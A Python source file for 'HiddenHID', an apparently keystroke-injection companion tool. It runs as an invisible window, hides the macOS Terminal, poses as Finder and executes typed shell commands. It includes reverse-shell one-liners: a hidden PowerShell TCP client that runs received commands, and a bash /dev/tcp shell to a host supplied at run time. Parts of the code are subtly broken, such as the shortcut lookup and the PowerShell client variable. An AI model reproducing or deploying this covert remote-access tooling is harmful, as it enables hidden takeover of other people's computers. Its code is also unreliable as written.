"""
HiddenHID by BrightShard
Explanation & documentation in the README on my GitHub page:
https://github.com/Bright-Shard/HiddenHID
"""

# For the invisible GUI
from tkinter import Tk, Entry, Menu
# Run commands in a shell
from subprocess import run as shell
# For enabling debug
from sys import argv
# Get host OS
from platform import system as os
# For RegExp, unfortunately
from re import search


class App(Tk):
    """
    The invisible app that runs terminal commands
    """
    def __init__(self):
        # Store host OS
        self.os = os()
        # Whether the app should be visible
        self.visible = False
        # If there should be extra output
        self.debug = False
        # If an output file is set
        self.output = None
        # Actually set up Tkinter
        super().__init__()

        # Parse command-line arguments
        for arg in argv:
            # The output argument: "output path/to/log/file" or "output=path/to/log/file"
            # "HiddenHID loaded" will be appended to the file at that location
            if search("^-*o(utput)?=.*$", arg) is not None:
                outFile = arg.split('=', 1)[1]
                self.output = open(outFile, 'a')
                self.log(f"Output file set to '{outFile}'")
            # The visible argument: "vis" or "visible"
            # Makes the normally invisible window visible, as well as the terminal on macOS
            elif search("^-*v(is)?(ible)?$", arg) is not None:
                self.visible = True
            # Debug argument: "debug"
            # Adds additional output in the terminal, like a -v argument
            elif search("^-*d(ebug)?$", arg) is not None:
                self.debug = True
                self.log("Debug mode enabled")

        # macOS stuff (Darwin = macOS)
        if self.os == "Darwin":
            # If the window is supposed to be invisible
            if not self.visible:
                # Hide the terminal
                shell(
                    'osascript -e \'tell application "Finder"\nset visible of process "Terminal" to false\nend tell\'',
                    shell=True, check=False)
                # Make the window invisible
                self.attributes('-alpha', 0)

        # Windows stuff
        elif self.os == "Windows":
            # If the window is supposed to be invisible
            if not self.visible:
                # Make the window invisible
                self.attributes('-alpha', 0)
                # Hide the app icon from the app dock
                self.attributes('-toolwindow', True)

        # Other hosts
        else:
            # Make the window invisible
            self.attributes('-alpha', 0)

        # Shortcut commands
        # Reverse shell, coming soon(tm) :P
        def revShell(*args):
            # Windows' ridiculously long PowerShell script
            if self.os == "Windows":
                shell("powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(" +
                      f"{args[0]},{args[1]});$stream = $client.GetStream();" +
                      "[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
                      "{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
                      '$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";'
                      "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                      "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
                      shell=True,
                      check=False)
            # The much simpler Bash script for the fancy macOS/Linux bois *sips tea*
            else:
                shell(f"sh -i >& /dev/tcp/{args[0]}/{args[1]} 0>&1", shell=True, check=False)

        # Shortcut commands, ranging from pranks to exploits
        self.shortcuts = {
            # macOS shortcuts
            'Darwin': {
                # Change the macOS wallpaper: Run as "wallpaper <image url>"
                'wallpaper': 'curl -o "/tmp/wallpaper" "{args[0]}"; osascript -e \'tell application\
                     "Finder" to set the desktop picture to POSIX file "/tmp/wallpaper"\'; rm\
                     /tmp/wallpaper',
                # Set the macOS volume level: Run as "volume <volume level>", with a min of 0 and max of 10
                'volume': 'osascript -e \'set Volume {args[0]}\'',
                # Set the macOS volume to 0
                'mute': 'osascript -e \'set Volume 0\'',
                # Reverse shell (See above)
                'shell': revShell
            },
            # Windows shortcuts
            'Windows': {
                # Reverse shell (See above)
                'shell': revShell
            }
        }

        # Commands are typed into the entry box
        self.entry = Entry(self)
        # Add it to the window
        self.entry.pack()
        # Focus the entry box so the keyboard types into it
        self.entry.focus()
        # Bind the enter key to run the command
        self.entry.bind('<Enter>', self.run_command)
        # It's the return key on some devices, so bind that too
        self.entry.bind('<Return>', self.run_command)

        # On macOS, toolbars still show for invisible apps
        # This clones the toolbar from Finder, so it looks like Finder is open
        # Just make sure the file is named "Finder" so that's what is displayed as the app name
        if self.os == "Darwin":
            # The app toolbar
            menu = Menu(self)
            # Blank menu for each toolbar item
            # Programming in each toolbar action is just too much effort lol
            submenu = Menu(menu, tearoff=0)
            # Each of the toolbar menus in Finder, cloned here
            menu.add_cascade(label="File", menu=submenu)
            menu.add_cascade(label="Edit", menu=submenu)
            menu.add_cascade(label="View", menu=submenu)
            menu.add_cascade(label="Go", menu=submenu)
            menu.add_cascade(label="Window", menu=submenu)
            menu.add_cascade(label="Help", menu=submenu)
            self.config(menu=menu)

        # Log that the app has started
        self.log("HiddenHID loaded successfully\n")

    def run_command(self, *args, **kwargs):
        """
        When 'enter' is pressed, run the command in Subprocess
        The command is taken from the entry widget's text, then the entry widget is cleared
        """
        # Get the text box contents to get the command
        command = self.entry.get()

        # If it's blank, don't even process the command
        if command == '':
            return

        # Debug
        self.log(f"Running command '{command}'...")

        # Exit if the command is 'exit'
        if command == "exit":
            self.quit()

        # Split the command up to get the arguments
        splitCommand = self.entry.get().split(' ')

        # If the command is a shortcut, run the shortcut
        if splitCommand[0] in self.shortcuts:
            # Print that a shortcut was detected
            self.log("-> Shortcut detected! Running a shortcut instead.")
            # The shortcut
            shortcut = self.shortcuts[splitCommand[0]]
            # If the shortcut is a string, run it as a shell script
            if type(shortcut) == str:
                shell(shortcut.format(args=splitCommand[1:]))
            # If the shortcut is a function, run the python code
            elif callable(shortcut):
                shortcut(splitCommand[1:])
            return

        # Run the command
        shell(command, shell=True, check=False)

        # Clear the command input
        self.entry.delete(0, len(self.entry.get()))
        # Print a new line for a separator between command outputs
        print('')

    def log(self, message: str):
        if self.debug:
            print(message)
            if self.output is not None:
                self.output.write(message+'\n')

    def quit(self):
        """
        Quit the app and close any open terminals
        """
        print("Exiting...")
        # macOS stuff
        if self.os == 'Darwin':
            # Kill all terminals
            shell('killall Terminal', shell=True)


App().mainloop()
